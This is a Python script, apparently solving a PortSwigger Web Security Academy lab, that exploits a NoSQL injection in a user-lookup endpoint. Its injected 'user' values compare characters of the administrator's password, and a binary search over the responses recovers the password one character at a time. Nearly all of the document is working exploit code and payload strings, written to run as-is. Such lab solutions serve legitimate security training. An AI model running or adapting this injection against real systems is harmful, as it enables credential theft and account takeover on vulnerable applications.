import requests
from typing import Optional

burp0_url = "https://0a0400760360b68981c5d48b00dc003b.web-security-academy.net:443/user/lookup"
burp0_cookies = {"session": "qFv4EfME4w8FBHhIMAW3l5K9li4IITUF"}
burp0_headers = {"Sec-Ch-Ua": "\"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36", "Sec-Ch-Ua-Platform": "\"Linux\"", "Accept": "*/*", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://0a0400760360b68981c5d48b00dc003b.web-security-academy.net/my-account?id=wiener", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8", "Priority": "u=1, i", "Content-Type": "application/x-www-form-urlencoded"}
burp0_data = {"user": "administrator'&&this.password[0]=='%s'||'"}

def test_letter_less_than_letter(index: int, letter: str) -> bool:
    data = burp0_data.copy()
    data["user"] = f"administrator'&&this.password[{index}]<'{letter}'||'"

    r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=data)
    if "Could not find user" in r.text:
        return False
    return True

def test_letter_equal_letter(index: int, letter: str) -> bool:
    data = burp0_data.copy()
    data["user"] = f"administrator'&&this.password[{index}]=='{letter}'||'"

    r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=data)
    if "Could not find user" in r.text:
        return False
    return True

def find_letter(index: int) -> Optional[str]:
    begin = 97  # 'a' letter
    end = 122  # 'z' letter
    while begin < end-1:
        mid = (begin+end)//2
        print(f"[*] Trying less than: {chr(mid)}")
        if test_letter_less_than_letter(index, chr(mid)):
            end = mid
        else:
            begin = mid

    print(f"[*] Trying equal: {chr(begin)}")
    if test_letter_equal_letter(index, chr(begin)):
        return chr(begin)
    

    print(f"[*] Trying equal: {chr(end)}")
    if test_letter_equal_letter(index, chr(end)):
        return chr(end)

    return None
    

password = ""
for i in range(100):
    if letter := find_letter(i):
        password += letter
        print(f"[?] Current password: {password}")
    else:
        print(f"[!] Found: {password}")
        break